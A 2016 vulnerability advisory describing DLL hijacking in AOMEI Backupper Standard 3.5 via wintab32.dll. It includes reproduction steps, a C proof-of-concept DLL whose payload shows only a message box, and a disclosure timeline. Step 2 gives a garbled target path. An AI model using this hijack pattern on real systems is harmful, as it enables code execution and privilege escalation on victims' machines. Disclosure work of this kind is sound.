=====================================================
[#] Exploit Title : AOMEI Backupper Standard 3.5 - DLL Hijacking Vulnerability
[#] Date Discovered : 2016-10-19
[#] Affected Product(s): AOMEI Backupper Standard v3.5 - Software
[#] Exploitation Technique: Local
[#] Severity Level: Medium
[#] Tested OS : Windows 7
=====================================================


[#] Product & Service Introduction:
===================================
Aomei Backupper includes tools to back up and easily restore your files and folders, the operating system, partitions or the entire disk. It also includes other useful functions such as disk cloning and is easy to use. It allows to create a recovery disk based on Linux or Windows PE.
It supports incremental and differential backups. Backups can be scheduled.The saved data can be encrypted.

(Copy of the Vendor Homepage: http://www.backup-utility.com/ )


[#] Technical Details & Description:
====================================
A local dll injection vulnerability has been discovered in the official AOMEI Backupper Standard v3.5 software.
The issue allows local attackers to inject code to vulnerable libraries to compromise the process or to gain higher access privileges.

Vulnerable Software:
           [+] AOMEI Backupper Standard

Vulnerable Version(s):
           [+] v3.5

Vulnerable Libraries:
           [+] wintab32.dll


[#] Proof of Concept (PoC):
===========================
The dll hijack vulnerability can be exploited by local attackers with restricted system user account and without user interaction.
For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.

Manual steps to reproduce the local vulnerability ...
1. Compile dll and rename to wintab32.dll
2. Copy wintab32.dll to C:\Program Files\AOEMI Backupper\Backupper.exe
3. Launch Backupper.exe
4. MessageBox Executed

-- PoC Exploit --

#include <windows.h>
#define DllExport __declspec (dllexport)

BOOL WINAPI DllMain (
HANDLE hinstDLL,
DWORD fdwReason,
LPVOID lpvReserved)
{
dll_hijack();
return 0;
}

int dll_hijack()
{
MessageBox(0, "DLL Hijacking By ZwX!", "DLL Message", MB_OK);
return 0;
}



[#] Vulnerability Disclosure Timeline:
======================================
2016-10-19 : Discovery of the Vulnerability
2016-10-19 : Contact the Vendor
2016-10-20 : Response of Vendor
2016-11-27 : Vulnerability no fixed
2016-11-28 : Public Disclosure


[#] Disclaimer:
===============
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author.
The author is not responsible for any misuse of the information contained herein and prohibits any malicious use of all security related information or exploits by the author or elsewhere.


Domain:     www.zwx.fr
Contact:    msk4@live.fr	
Social:     twitter.com/XSSed.fr
Feeds:      www.zwx.fr/feed/
Advisory:   www.vulnerability-lab.com/show.php?user=ZwX
            packetstormsecurity.com/files/author/12026/
            cxsecurity.com/search/author/DESC/AND/FIND/0/10/ZwX/
            0day.today/author/27461


				                     Copyright (c) 2016 | ZwX - Security Researcher (Software & web application)
